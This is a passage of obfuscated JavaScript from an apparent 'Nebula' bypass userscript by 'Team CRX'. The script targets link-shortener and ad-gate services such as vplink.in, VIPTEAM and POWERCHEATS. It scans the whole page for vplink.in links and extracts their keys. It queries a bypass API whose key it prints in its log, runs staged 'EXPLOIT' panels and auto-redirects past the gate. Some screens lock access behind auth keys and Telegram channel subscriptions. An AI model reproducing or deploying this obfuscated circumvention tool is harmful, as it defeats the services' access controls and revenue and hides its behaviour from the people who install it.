      _0x50db77.style.boxShadow = "inset 3px 3px 6px var(--emboss-shadow),inset -3px -3px 6px var(--emboss-light)";
      _0x50db77.title = "Music paused - Click to play";
    } else {
      _0x50db77.textContent = "♪";
      _0x50db77.style.boxShadow = "3px 3px 6px var(--emboss-shadow),-3px -3px 6px var(--emboss-light)";
      _0x50db77.title = "Music playing - Click to pause";
    }
  };
  _0x747991();
  _0x50db77.addEventListener("click", () => {
    if (!_0x44cf5a()) {
      _0x2e5a49 = true;
      _0x22c702.log("MUSIC", "User manually enabled music on metered connection");
      _0x3f1a84("🎵 Music enabled (mobile data)");
      _0x1159ff();
      _0x747991();
      _0x7152d6();
      return;
    }
    if (!_0x26f1f4) {
      _0x1159ff();
      _0x747991();
      return;
    }
    if (_0x26f1f4.paused) {
      _0x26f1f4.play().catch(() => {});
    } else {
      _0x26f1f4.pause();
    }
    _0x747991();
  });
}
function _0x22c71b() {
  if (!window.DeviceMotionEvent) {
    return;
  }
  if (typeof DeviceMotionEvent.requestPermission === "function") {
    DeviceMotionEvent.requestPermission().then(_0x52359b => {
      if (_0x52359b === "granted") {
        _0x352b52();
      }
    }).catch(() => {});
  } else {
    _0x352b52();
  }
}
function _0x352b52() {
  window.addEventListener("devicemotion", _0x12a215 => {
    const _0x5626f = _0x12a215.accelerationIncludingGravity;
    if (!_0x5626f) {
      return;
    }
    if (_0x97d8de === null) {
      _0x97d8de = _0x5626f.x;
      _0x20701c = _0x5626f.y;
      _0x13e6d4 = _0x5626f.z;
      return;
    }
    if (Math.abs(_0x5626f.x - _0x97d8de) + Math.abs(_0x5626f.y - _0x20701c) + Math.abs(_0x5626f.z - _0x13e6d4) > 15 && !_0x4c4906) {
      _0x4c4906 = setTimeout(() => _0x4c4906 = null, 1000);
      _0x244b8e();
    }
    _0x97d8de = _0x5626f.x;
    _0x20701c = _0x5626f.y;
    _0x13e6d4 = _0x5626f.z;
  });
}
function _0x3f1a84(_0x545b3d) {
  const _0x1782fa = document.createElement("div");
  _0x1782fa.textContent = _0x545b3d;
  _0x1782fa.style.cssText = "position:fixed;bottom:80px;left:50%;transform:translateX(-50%);z-index:2147483647;background:var(--bg-color);border:none;color:var(--text-color);padding:10px 24px;border-radius:14px;font-size:12px;font-weight:600;letter-spacing:1px;pointer-events:none;box-shadow:6px 6px 12px var(--emboss-shadow),-6px -6px 12px var(--emboss-light);animation:nb-toast-in 0.3s ease;font-family:'Segoe UI',Roboto,sans-serif;";
  document.body.appendChild(_0x1782fa);
  setTimeout(() => {
    _0x1782fa.style.opacity = "0";
    _0x1782fa.style.transition = "opacity 0.3s";
    setTimeout(() => _0x1782fa.remove(), 300);
  }, 1500);
}
function _0x2c6881() {
  if (_0x4ffa6e) {
    clearTimeout(_0x4ffa6e);
  }
  if (_0x581bc0) {
    clearTimeout(_0x581bc0);
  }
  if (_0x5ddb20) {
    cancelAnimationFrame(_0x5ddb20);
  }
  if (_0xd05830) {
    cancelAnimationFrame(_0xd05830);
  }
  if (_0x49995c) {
    clearTimeout(_0x49995c);
  }
  _0x5a024e.forEach(_0x995c47 => clearTimeout(_0x995c47));
  _0x5a024e = [];
  _0x2c0ec9();
  _0x38dd9f();
}
function _0x3eec3d(_0x2c6e87, _0x1ea349, _0x30ad9c) {
  if (_0x21e0aa) {
    return;
  }
  _0x21e0aa = true;
  _0x22c702.log("REDIRECT", "Redirecting to: " + _0x2c6e87.substring(0, 60));
  if (_0x26f1f4) {
    try {
      _0x26f1f4.pause();
    } catch (_0x5c6147) {}
  }
  if (_0x1ea349) {
    _0x1ea349.style.transition = "opacity 0.4s";
    _0x1ea349.style.opacity = "0";
    setTimeout(() => {
      _0x1ea349.remove();
    }, 400);
  }
  setTimeout(() => {
    window.location.href = _0x2c6e87;
  }, 500);
}
function _0x426b1d(_0x41157c, _0x4df42b, _0x28d068, _0x23c3d7, _0x33c10f, _0x4d76d1, _0x59d7b4 = false) {
  _0x22c702.log("UI", "Showing panel: " + _0x4df42b);
  _0x2c6881();
  document.querySelector(".nb-overlay")?.remove();
  _0x1d01e5();
  const _0x2b7411 = document.createElement("div");
  _0x2b7411.className = "nb-overlay";
  const _0x3754b5 = Array.isArray(_0x28d068) ? _0x28d068.map(_0x4c62d4 => "<p class=\"nb-status-user\" style=\"margin:2px 0;\">" + _0x4c62d4 + "</p>").join("") : "<p class=\"nb-subtitle\">" + _0x28d068 + "</p>";
  const _0x99dcba = _0x59d7b4 ? "nb-suspended-icon" : "nb-status-icon";
  const _0x2101ac = _0x59d7b4 ? "nb-emboss-btn nb-unban-btn" : "nb-emboss-btn";
  const {
    wrapper: _0x1bd551
  } = _0x154f83("\n      <div class=\"" + _0x99dcba + "\">" + _0x41157c + "</div>\n      <h3 class=\"nb-title\">" + _0x4df42b + "</h3>\n      " + _0x3754b5 + "\n      " + (_0x23c3d7 ? "<button class=\"" + _0x2101ac + "\" id=\"nb-status-btn\" style=\"margin-top:14px;\">" + _0x23c3d7 + "</button>" : "") + "\n      " + (_0x4d76d1 ? "<p style=\"color:var(--text-muted);font-size:10px;margin-top:12px;\">Auto-redirect in <span id=\"nb-countdown\" style=\"font-weight:700;\">" + _0x4d76d1 + "</span>s</p>" : "") + "\n      <p class=\"nb-footer\" style=\"margin-top:12px;\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</p>\n    ", "overflow-visible");
  _0x2b7411.appendChild(_0x1bd551);
  document.body.appendChild(_0x2b7411);
  if (_0x23c3d7 && _0x33c10f) {
    document.getElementById("nb-status-btn")?.addEventListener("click", _0x33c10f);
  }
  if (_0x4d76d1 && _0x33c10f) {
    let _0x8a131a = _0x4d76d1;
    const _0x11b29f = document.getElementById("nb-countdown");
    _0x581bc0 = setInterval(() => {
      _0x8a131a--;
      if (_0x11b29f) {
        _0x11b29f.textContent = _0x8a131a;
      }
      if (_0x8a131a <= 0) {
        clearInterval(_0x581bc0);
        _0x33c10f();
      }
    }, 1000);
  }
}
  function _0x221b88() {
    _0xab5761 = true;
    _0x426b1d("🚫", "ACCESS BANNED", ["USER: " + _0x50c9a2.name, "ID: " + _0x50c9a2.id, "Contact developer for access"], "⚡ DEVELOPER CHANNEL", () => window.open("https://t.me/HQcrx", "_blank"), 10);
  }
  function _0x1d0203() {
    _0xab5761 = true;
    _0x426b1d("⛔", "ACCOUNT SUSPENDED", ["USER: " + _0x50c9a2.name, "ID: " + _0x50c9a2.id, "This custom bypass has been suspended.", "Bypass creator didn't subscribed to required channel. Click below to Restore."], "🔓 Regain Access", () => window.open("https://t.me/yournebulabot/start", "_blank"), null, true);
  }
  function _0x115f79() {
    _0x426b1d("⚠", "NEBULA OUTDATED", "SIGNATURE MISMATCH", _0x1ec570() ? "⬇ DOWNLOAD LATEST" : null, _0x1ec570() ? () => window.open(_0x315432(), "_blank") : null);
  }
  function _0x5cf655() {
    _0x426b1d("🔧", "MAINTENANCE", "SYSTEM UPDATE IN PROGRESS", _0x1ec570() ? "⚡ JOIN CHANNEL" : null, _0x1ec570() ? () => window.open(_0x315432(), "_blank") : null);
  }
  function _0x6df88b() {
    _0x22c702.log("UI", "Rendering INIT panel");
    document.getElementById("nebula-auth")?.remove();
    _0x238270 = false;
    _0x339012 = false;
    _0x1d01e5();
    const _0x292db6 = document.createElement("div");
    _0x292db6.id = "nebula-auth";
    _0x292db6.className = "nb-overlay";
    const _0x3b41a9 = _0x4048be() ? "\n      <div style=\"margin-bottom:8px;\">\n        <input id=\"nb-pass-input\" class=\"nb-emboss-input\" type=\"text\" autocomplete=\"off\" placeholder=\"AUTH KEY\">\n      </div>\n      <p id=\"nb-pass-error\" class=\"nb-error-text\">⛔ WRONG AUTH KEY</p>\n    " : "";
    const {
      wrapper: _0xefd6bf,
      focusGlow1: _0x3d9b11,
      focusGlow2: _0x3d7ae9
    } = _0x154f83("\n      <button id=\"music-btn\" class=\"nb-music-btn\">♪</button>\n      <div class=\"nb-uid\">" + _0x1db9e0 + " [UID:" + _0x50c9a2.id + "]</div>\n      <h3 class=\"nb-title\">" + _0x50c9a2.name + "</h3>\n      <div class=\"nb-divider\"></div>\n      <p style=\"color:var(--text-color);font-size:10px;letter-spacing:3px;\">◆ SYSTEM READY</p>\n      <div id=\"nb-track-name\" class=\"nb-track\"></div>\n      " + _0x3b41a9 + "\n      <button id=\"init-btn\" class=\"nb-emboss-btn\">⬡ START BYPASS</button>\n      " + (_0x1ec570() ? "<button id=\"support-btn\" class=\"nb-emboss-btn\">⚡ TELEGRAM</button>" : "") + "\n      <div class=\"nb-footer\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</div>\n    ", "overflow-visible");
    _0x292db6.appendChild(_0xefd6bf);
    document.body.appendChild(_0x292db6);
    const _0x46cb78 = document.getElementById("nb-pass-input");
    if (_0x46cb78) {
      _0x46cb78.addEventListener("focus", () => _0x2fbf89(_0x3d9b11, _0x3d7ae9));
      _0x46cb78.addEventListener("blur", () => _0x273f12(_0x3d9b11, _0x3d7ae9));
    }
    _0x7152d6 = () => {
      const _0x4365ae = document.getElementById("nb-track-name");
      if (!_0x4365ae || !_0x2dc750.length) {
        if (_0x4365ae) {
          if (!_0x44cf5a()) {
            _0x4365ae.textContent = "♫ Music blocked (tap ♪ to enable)";
            _0x4365ae.className = "nb-track metered";
          } else {
            _0x4365ae.textContent = "";
            _0x4365ae.className = "nb-track";
          }
        }
        return;
      }
      if (!_0x44cf5a()) {
        if (_0x4365ae) {
          _0x4365ae.textContent = "♫ Music blocked (tap ♪ to enable)";
          _0x4365ae.className = "nb-track metered";
        }
        return;
      }
      try {
        const _0x2926e5 = decodeURIComponent(_0x2dc750[_0x3c79ba].split("/").pop().replace(/\.[^.]+$/, "").replace(/[-_]/g, " "));
        if (_0x4365ae) {
          _0x4365ae.textContent = "♫ " + (_0x2926e5.length > 20 ? _0x2926e5.slice(0, 20) + "…" : _0x2926e5);
          _0x4365ae.className = "nb-track";
        }
      } catch {
        if (_0x4365ae) {
          _0x4365ae.textContent = "♫ Track " + (_0x3c79ba + 1);
          _0x4365ae.className = "nb-track";
        }
      }
    };
    if (_0x2dc750.length && _0x44cf5a()) {
      _0x1159ff();
    } else {
      _0x7152d6();
    }
    _0x22c71b();
    _0x2a5e40("music-btn");
    const _0x42a7ea = document.getElementById("support-btn");
    if (_0x42a7ea) {
      _0x42a7ea.addEventListener("click", () => window.open(_0x315432(), "_blank"));
    }
    const _0x2fe69c = document.getElementById("init-btn");
    const _0x116ea2 = document.getElementById("nb-pass-error");
    function _0x122665() {
      if (_0x2fe69c.disabled || _0x238270) {
        return;
      }
      if (_0x4048be()) {
        if (!_0x46cb78 || !_0x41c6de(_0x46cb78.value)) {
          if (_0x116ea2) {
            _0x116ea2.style.display = "block";
          }
          if (_0x46cb78) {
            _0x46cb78.classList.add("error");
            setTimeout(() => _0x46cb78.classList.remove("error"), 400);
          }
          return;
        } else {
          if (_0x116ea2) {
            _0x116ea2.style.display = "none";
          }
          if (_0x46cb78) {
            _0x46cb78.classList.remove("error");
            _0x46cb78.classList.add("success");
          }
          _0x339012 = true;
        }
      } else {
        _0x339012 = true;
      }
      _0x2fe69c.disabled = true;
      if (_0x42a7ea) {
        _0x42a7ea.disabled = true;
      }
      if (_0x4ffa6e) {
        clearTimeout(_0x4ffa6e);
      }
      _0x273f12(_0x3d9b11, _0x3d7ae9);
      if (_0x21c643) {
        _0x3878b6 = _0x21c643.target;
        _0x426943 = _0x21c643.name;
        _0x3b3a2d = _0x21c643.moduleType;
        _0x292db6.style.transition = "opacity 0.3s";
        _0x292db6.style.opacity = "0";
        setTimeout(() => {
          _0x292db6.remove();
          if (_0x21c643.moduleType === "vipteam") {
            _0x2097b9(_0x21c643.apiType);
          } else if (_0x21c643.moduleType === "powercheats") {
            _0x2c27dd(_0x21c643.apiType);
          } else if (_0x21c643.moduleType === "universal-vplink") {
            _0x54683f(_0x21c643.apiType);
          } else {
            _0x29f3cf(_0x21c643.apiType);
          }
        }, 300);
      } else {
        _0xa05075(_0x292db6);
      }
    }
    _0x2fe69c.addEventListener("click", _0x122665);
    if (_0x46cb78) {
      _0x46cb78.addEventListener("keydown", _0x5ac7f9 => {
        if (_0x5ac7f9.key === "Enter") {
          _0x5ac7f9.preventDefault();
          _0x122665();
        }
      });
      _0x46cb78.addEventListener("input", () => {
        if (_0x116ea2 && _0x116ea2.style.display === "block") {
          _0x116ea2.style.display = "none";
          _0x46cb78.classList.remove("error");
        }
      });
    }
    _0x4ffa6e = setTimeout(() => {
      const _0x4d3e7a = document.getElementById("init-btn");
      if (_0x4d3e7a && !_0x4d3e7a.disabled && !_0x238270) {
        _0x122665();
      }
    }, _0x3edb97.autoInitDelay);
  }
  function _0xa05075(_0x28b55b) {
    document.getElementById("target-selection")?.remove();
    _0x238270 = true;
    const _0x101d7d = document.createElement("div");
    _0x101d7d.id = "target-selection";
    _0x101d7d.className = "nb-overlay";
    _0x101d7d.style.zIndex = "2147483648";
    const {
      wrapper: _0x42dadf
    } = _0x154f83("\n      <button id=\"target-back-btn\" class=\"nb-back-btn\">←</button>\n      <button id=\"target-music-btn\" class=\"nb-music-btn\">♪</button>\n      <div class=\"nb-uid\">SELECT TARGET</div>\n      <h3 class=\"nb-title\">SELECT TARGET</h3>\n      <div class=\"nb-divider\"></div>\n      <button id=\"target-aincrad\" class=\"nb-emboss-btn\">⬡ Aincrad</button>\n      <button id=\"target-aincrad-proxy\" class=\"nb-emboss-btn\">⬡ AINCRAD PROXY</button>\n      <button id=\"target-vipteam\" class=\"nb-emboss-btn\">⬡ VIPTEAM</button>\n      <button id=\"target-powercheats\" class=\"nb-emboss-btn\">⬡ POWERCHEATS</button>\n      <button id=\"target-universal-vplink\" class=\"nb-emboss-btn\">⬡ UNIVERSAL VPLINK.IN</button>\n      <div class=\"nb-footer\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</div>\n    ", "overflow-visible");
    _0x101d7d.appendChild(_0x42dadf);
    document.body.appendChild(_0x101d7d);
    document.getElementById("target-back-btn").addEventListener("click", function () {
      if (!_0x238270) {
        return;
      }
      _0x238270 = false;
      _0x101d7d.style.transition = "opacity 0.3s";
      _0x101d7d.style.opacity = "0";
      setTimeout(() => {
        _0x101d7d.remove();
        _0x339012 = false;
        _0x6df88b();
      }, 300);
    });
    _0x2a5e40("target-music-btn");
    document.getElementById("target-aincrad").addEventListener("click", async function () {
      if (!_0x238270) {
        return;
      }
      _0x22c702.log("UI", "Selected: Aincrad");
      await _0x4f0ed2("aincrad", "Aincrad", "2", "standard", _0x101d7d, _0x28b55b);
    });
    document.getElementById("target-aincrad-proxy").addEventListener("click", async function () {
      if (!_0x238270) {
        return;
      }
      _0x22c702.log("UI", "Selected: AINCRAD PROXY");
      await _0x4f0ed2("aincrad-proxy", "AINCRAD PROXY", "1", "standard", _0x101d7d, _0x28b55b);
    });
    document.getElementById("target-vipteam").addEventListener("click", async function () {
      if (!_0x238270) {
        return;
      }
      _0x22c702.log("UI", "Selected: VIPTEAM");
      await _0x4f0ed2("vipteam", "VIPTEAM", "vp", "vipteam", _0x101d7d, _0x28b55b);
    });
    document.getElementById("target-powercheats").addEventListener("click", async function () {
      if (!_0x238270) {
        return;
      }
      _0x22c702.log("UI", "Selected: POWERCHEATS");
      await _0x4f0ed2("powercheats", "POWERCHEATS", "vp", "powercheats", _0x101d7d, _0x28b55b);
    });
    document.getElementById("target-universal-vplink").addEventListener("click", async function () {
      if (!_0x238270) {
        return;
      }
      _0x22c702.log("UI", "Selected: UNIVERSAL VPLINK.IN");
      await _0x4f0ed2("universal-vplink", "UNIVERSAL VPLINK.IN", "vp", "universal-vplink", _0x101d7d, _0x28b55b);
    });
  }
  async function _0x4f0ed2(_0x5b8628, _0x2eb2b5, _0xa2d61a, _0x43dc9b, _0x3613f9, _0x399299) {
    _0x3878b6 = _0x5b8628;
    _0x426943 = _0x2eb2b5;
    _0x3b3a2d = _0x43dc9b;
    _0x238270 = false;
    const _0x35dc8b = document.getElementById("target-aincrad");
    const _0x47e013 = document.getElementById("target-aincrad-proxy");
    const _0x58ff7a = document.getElementById("target-vipteam");
    const _0x141da0 = document.getElementById("target-powercheats");
    const _0x202bdd = document.getElementById("target-universal-vplink");
    if (_0x35dc8b) {
      _0x35dc8b.disabled = true;
    }
    if (_0x47e013) {
      _0x47e013.disabled = true;
    }
    if (_0x58ff7a) {
      _0x58ff7a.disabled = true;
    }
    if (_0x141da0) {
      _0x141da0.disabled = true;
    }
    if (_0x202bdd) {
      _0x202bdd.disabled = true;
    }
    _0x3613f9.style.transition = "opacity 0.3s";
    _0x3613f9.style.opacity = "0";
    if (_0x399299) {
      _0x399299.style.transition = "opacity 0.3s";
      _0x399299.style.opacity = "0";
    }
    setTimeout(() => {
      _0x3613f9.remove();
      if (_0x399299) {
        _0x399299.remove();
      }
      if (_0x43dc9b === "vipteam") {
        _0x2097b9(_0xa2d61a);
      } else if (_0x43dc9b === "powercheats") {
        _0x2c27dd(_0xa2d61a);
      } else if (_0x43dc9b === "universal-vplink") {
        _0x54683f(_0xa2d61a);
      } else {
        _0x29f3cf(_0xa2d61a);
      }
    }, 300);
  }
  function _0x29f3cf(_0x2da356) {
    _0x22c702.log("UI", "Rendering STANDARD EXPLOIT panel, apiType=" + _0x2da356);
    document.getElementById("nebula-exploit")?.remove();
    _0x45d06b = false;
    _0x3db848 = null;
    _0x2850af = false;
    _0x1d9364 = [];
    _0x149fe9 = false;
    const _0x37d1c3 = document.createElement("div");
    _0x37d1c3.id = "nebula-exploit";
    _0x37d1c3.className = "nb-overlay";
    const {
      wrapper: _0x442cc6
    } = _0x154f83("\n      <button id=\"exploit-music-btn\" class=\"nb-music-btn\">♪</button>\n      <div class=\"nb-exploit-header\">\n        <span class=\"nb-live-dot\"></span>\n        <span style=\"width:7px;height:7px;background:#f90;border-radius:50%;box-shadow:0 0 6px #f90;flex-shrink:0;\"></span>\n        <span style=\"width:7px;height:7px;background:var(--electric-glow-1);border-radius:50%;box-shadow:0 0 6px var(--electric-glow-1);flex-shrink:0;\"></span>\n        <span class=\"nb-exploit-title\">" + _0x3c10b7 + "://" + _0x50c9a2.name.replace(/\s+/g, "_").toUpperCase() + "</span>\n        <span id=\"nb-live-status\" style=\"color:var(--info-color);font-size:8px;margin-left:auto;animation:nb-pulse 1.5s infinite;flex-shrink:0;font-weight:700;\">● LIVE</span>\n      </div>\n      \n      <div id=\"log-output\" class=\"nb-log-area\"></div>\n      \n      <div class=\"nb-progress-label\">\n        <span>PROGRESS</span>\n        <span id=\"nb-progress-pct\" style=\"font-weight:700;\">0%</span>\n      </div>\n      <div class=\"nb-progress-bar-bg\">\n        <div id=\"nb-progress-exploit\" class=\"nb-progress-bar-fill\"></div>\n      </div>\n      \n      <div class=\"nb-footer\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</div>\n    ");
    _0x37d1c3.appendChild(_0x442cc6);
    document.body.appendChild(_0x37d1c3);
    _0x2a5e40("exploit-music-btn");
    _0x4a2c1e();
    _0x455c4e("⚡", _0x1db9e0 + " — " + _0x426943, "#00f2ff", "log-highlight");
    _0x455c4e("◆", "PLATFORM: " + navigator.platform.toUpperCase(), "#718096");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("⚙", "SYSTEM CONFIGURATION", "#ffa500", "log-highlight");
    _0x455c4e("●", "STATUS: ACTIVE", "#2ecc71", "log-success");
    _0x455c4e("●", "MODULE: STANDARD", "#00f2ff");
    _0x455c4e("●", "API ENDPOINT: " + _0x3edb97.apiBaseUrl, "#4a5568");
    _0x455c4e("●", "API KEY: " + _0x3edb97.apiKey, "#4a5568");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("👤", "USER PROFILE", "#ffa500", "log-highlight");
    _0x455c4e("●", "NAME: " + _0x50c9a2.name.toUpperCase(), "#4a5568");
    _0x455c4e("●", "USER ID: " + _0x50c9a2.id, "#4a5568");
    _0x455c4e("●", "AUTH REQUIRED: " + (_0x4048be() ? "YES" : "NO"), _0x4048be() ? "#ffa500" : "#2ecc71");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("📡", "INITIALIZING CONNECTION...", "#00f2ff", "log-highlight");
    _0x455c4e("●", "TARGET TYPE: " + _0x2da356, "#4a5568");
    _0x10c2be = Date.now();
    _0xd07885 = _0x3edb97.minProgressTime;
    _0x19023b();
    _0x14c516(_0x2da356);
  }
  async function _0x14c516(_0x2cec1a) {
    const _0x2acf81 = await _0x444775(_0x2cec1a);
    _0x45ddd7 = _0x2acf81.url;
    _0x2ac765 = _0x2acf81.url;
    _0x1d398b = _0x2acf81.apiData;
    _0x1e203f = _0x2acf81.pin || _0x1e203f;
    _0x7d8b23 = _0x2acf81.isReal;
    _0x3db848 = _0x2acf81;
    _0x45d06b = true;
    _0x22c702.log("API", "Live fetch completed, isReal=" + _0x2acf81.isReal);
  }
  function _0x19023b() {
    _0x78fd44 = true;
    const _0x5d8d08 = document.getElementById("nb-progress-exploit");
    const _0x59166e = document.getElementById("nb-progress-pct");
    const _0x54ec84 = Date.now();
    (function _0x194fc5() {
      if (!_0x78fd44) {
        return;
      }
      const _0x1c846f = Date.now() - _0x54ec84;
      const _0x13002e = _0xd07885 || _0x3edb97.minProgressTime;
      const _0x477378 = Math.min(_0x1c846f / _0x13002e * 100, 100);
      if (_0x5d8d08) {
        _0x5d8d08.style.width = _0x477378 + "%";
        if (_0x45d06b && _0x3db848 && (_0x3db848.isError || _0x3db848.isFakeUrl)) {
          _0x5d8d08.classList.add("error-fill");
        }
      }
      if (_0x59166e) {
        _0x59166e.textContent = Math.floor(_0x477378) + "%";
      }
      if (_0x477378 >= 100) {
        _0x78fd44 = false;
        _0x2850af = true;
        _0x38dd9f();
        const _0x5d3b2e = document.getElementById("nb-live-status");
        if (_0x5d3b2e && _0x3db848) {
          if (_0x3db848.isError || _0x3db848.isFakeUrl) {
            _0x5d3b2e.textContent = "● REJECTED";
            _0x5d3b2e.style.color = "var(--danger-color)";
          } else {
            _0x5d3b2e.textContent = "● SUCCESS";
            _0x5d3b2e.style.color = "var(--success-color)";
          }
        }
        if (_0x3db848) {
          setTimeout(() => {
            _0x3eec3d(_0x3db848.url, document.getElementById("nebula-exploit"), _0x3db848.isReal);
          }, 300);
        }
      } else {
        _0xd05830 = requestAnimationFrame(_0x194fc5);
      }
    })();
  }
  function _0x2097b9(_0x23879e) {
    _0x22c702.log("UI", "Rendering VIPTEAM EXPLOIT panel, apiType=" + _0x23879e);
    document.getElementById("nebula-exploit")?.remove();
    _0x45d06b = false;
    _0x3db848 = null;
    _0x2850af = false;
    _0x1d9364 = [];
    _0x149fe9 = false;
    const _0x7c3acf = document.createElement("div");
    _0x7c3acf.id = "nebula-exploit";
    _0x7c3acf.className = "nb-overlay";
    const {
      wrapper: _0xd9c5f4
    } = _0x154f83("\n      <button id=\"exploit-music-btn\" class=\"nb-music-btn\">♪</button>\n      <div class=\"nb-exploit-header\">\n        <span class=\"nb-live-dot\"></span>\n        <span style=\"width:7px;height:7px;background:#ff00ff;border-radius:50%;box-shadow:0 0 6px #ff00ff;flex-shrink:0;\"></span>\n        <span style=\"width:7px;height:7px;background:var(--electric-glow-1);border-radius:50%;box-shadow:0 0 6px var(--electric-glow-1);flex-shrink:0;\"></span>\n        <span class=\"nb-exploit-title\">" + _0x3c10b7 + "://" + _0x50c9a2.name.replace(/\s+/g, "_").toUpperCase() + "</span>\n        <span id=\"nb-live-status\" style=\"color:var(--info-color);font-size:8px;margin-left:auto;animation:nb-pulse 1.5s infinite;flex-shrink:0;font-weight:700;\">● LIVE</span>\n      </div>\n      \n      <div id=\"log-output\" class=\"nb-log-area\"></div>\n      \n      <div class=\"nb-progress-label\">\n        <span>PROGRESS</span>\n        <span id=\"nb-progress-pct\" style=\"font-weight:700;\">0%</span>\n      </div>\n      <div class=\"nb-progress-bar-bg\">\n        <div id=\"nb-progress-exploit\" class=\"nb-progress-bar-fill\"></div>\n      </div>\n      \n      <div class=\"nb-footer\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</div>\n    ");
    _0x7c3acf.appendChild(_0xd9c5f4);
    document.body.appendChild(_0x7c3acf);
    _0x2a5e40("exploit-music-btn");
    _0x4a2c1e();
    _0x455c4e("⚡", _0x1db9e0 + " — " + _0x426943, "#ff00ff", "log-highlight");
    _0x455c4e("◆", "PLATFORM: " + navigator.platform.toUpperCase(), "#718096");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("⚙", "SYSTEM CONFIGURATION", "#ffa500", "log-highlight");
    _0x455c4e("●", "STATUS: ACTIVE", "#2ecc71", "log-success");
    _0x455c4e("●", "MODULE: VIPTEAM EXTRACTOR", "#ff00ff");
    _0x455c4e("●", "API ENDPOINT: " + _0x3edb97.apiBaseUrl, "#4a5568");
    _0x455c4e("●", "API KEY: " + _0x3edb97.apiKey, "#4a5568");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("👤", "USER PROFILE", "#ffa500", "log-highlight");
    _0x455c4e("●", "NAME: " + _0x50c9a2.name.toUpperCase(), "#4a5568");
    _0x455c4e("●", "USER ID: " + _0x50c9a2.id, "#4a5568");
    _0x455c4e("●", "AUTH REQUIRED: " + (_0x4048be() ? "YES" : "NO"), _0x4048be() ? "#ffa500" : "#2ecc71");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("🔍", "SCANNING PAGE FOR VPLINK.IN...", "#ff00ff", "log-highlight");
    _0x10c2be = Date.now();
    _0xd07885 = _0x3edb97.minProgressTime;
    _0x19023b();
    _0x14a095(_0x23879e);
  }
  function _0x158666() {
    try {
      _0x22c702.log("VIPTEAM", "Starting comprehensive vplink.in scan...");
      const _0x12642b = document.querySelectorAll("a");
      _0x22c702.log("VIPTEAM", "Scanning " + _0x12642b.length + " anchor tags...");
      for (let _0x5a037c of _0x12642b) {
        const _0x2fa84e = _0x5a037c.getAttribute("href");
        if (_0x2fa84e && _0x2fa84e.includes("vplink.in")) {
          const _0x45a89c = _0x2fa84e.match(/https?:\/\/vplink\.in\/[^\s"'<>]+/);
          if (_0x45a89c) {
            const _0x41136f = _0x45a89c[0].replace(/[.,;:'")\]}]+$/, "");
            _0x22c702.log("VIPTEAM", "Found vplink URL in <a> tag: " + _0x41136f);
            return _0x41136f;
          }
        }
      }
      _0x22c702.log("VIPTEAM", "Scanning text content of all elements...");
      const _0x37cb07 = document.querySelectorAll("p, div, span, td, li, pre, code, strong, em, b, i, h1, h2, h3, h4, h5, h6");
      for (let _0x38b6c0 of _0x37cb07) {
        const _0x28530b = _0x38b6c0.textContent || _0x38b6c0.innerText || "";
        const _0x3ff127 = _0x28530b.match(/https?:\/\/vplink\.in\/[^\s"'<>]+/);
        if (_0x3ff127) {
          const _0x2f0020 = _0x3ff127[0].replace(/[.,;:'")\]}]+$/, "");
          _0x22c702.log("VIPTEAM", "Found vplink URL in element text: " + _0x2f0020);
          return _0x2f0020;
        }
      }
      _0x22c702.log("VIPTEAM", "Full page text scan...");
      const _0x294329 = document.body.innerText;
      const _0x15e515 = _0x294329.match(/https?:\/\/vplink\.in\/[^\s"'<>]+/);
      if (_0x15e515) {
        const _0x2dd807 = _0x15e515[0].replace(/[.,;:'")\]}]+$/, "");
        _0x22c702.log("VIPTEAM", "Found vplink URL in body text: " + _0x2dd807);
        return _0x2dd807;
      }
      _0x22c702.log("VIPTEAM", "Scanning all element attributes...");
      const _0xdf5f58 = document.querySelectorAll("*");
      for (let _0x3a10eb of _0xdf5f58) {
        for (let _0x16371b of _0x3a10eb.attributes) {
          if (_0x16371b.value && _0x16371b.value.includes("vplink.in")) {
            const _0x24ccd8 = _0x16371b.value.match(/https?:\/\/vplink\.in\/[^\s"'<>]+/);
            if (_0x24ccd8) {
              const _0x1c324b = _0x24ccd8[0].replace(/[.,;:'")\]}]+$/, "");
              _0x22c702.log("VIPTEAM", "Found vplink URL in attribute: " + _0x1c324b);
              return _0x1c324b;
            }
          }
        }
      }
      _0x22c702.log("VIPTEAM", "No vplink.in URL found after comprehensive scan");
      return null;
    } catch (_0x4a69cd) {
      _0x22c702.error("VIPTEAM", "Extraction error: " + _0x4a69cd.message);
      return null;
    }
  }
  function _0x1a4a50(_0x20fca9) {
    try {
      let _0x201628 = _0x20fca9.trim();
      _0x201628 = _0x201628.split("?")[0].split("#")[0];
      const _0x277415 = new URL(_0x201628);
      let _0x336f77 = _0x277415.pathname;
      _0x336f77 = _0x336f77.replace(/^\/+|\/+$/g, "");
      const _0x2de6f0 = _0x336f77.split("/")[0];
      if (!_0x2de6f0 || _0x2de6f0.length === 0) {
        _0x22c702.error("VPLINK", "Empty key extracted from URL: " + _0x20fca9);
        return null;
      }
      _0x22c702.log("VPLINK", "Extracted VP key: " + _0x2de6f0);
      return _0x2de6f0;
    } catch (_0xb3b3fa) {
      _0x22c702.log("VPLINK", "URL parsing failed, trying regex extraction");
      try {
        const _0x440f5d = _0x20fca9.match(/vplink\.in\/([^\/\s?#]+)/);
        if (_0x440f5d && _0x440f5d[1]) {
          _0x22c702.log("VPLINK", "Regex extracted VP key: " + _0x440f5d[1]);
          return _0x440f5d[1];
        }
      } catch (_0x12ec5c) {
        _0x22c702.error("VPLINK", "Regex extraction also failed: " + _0x12ec5c.message);
      }
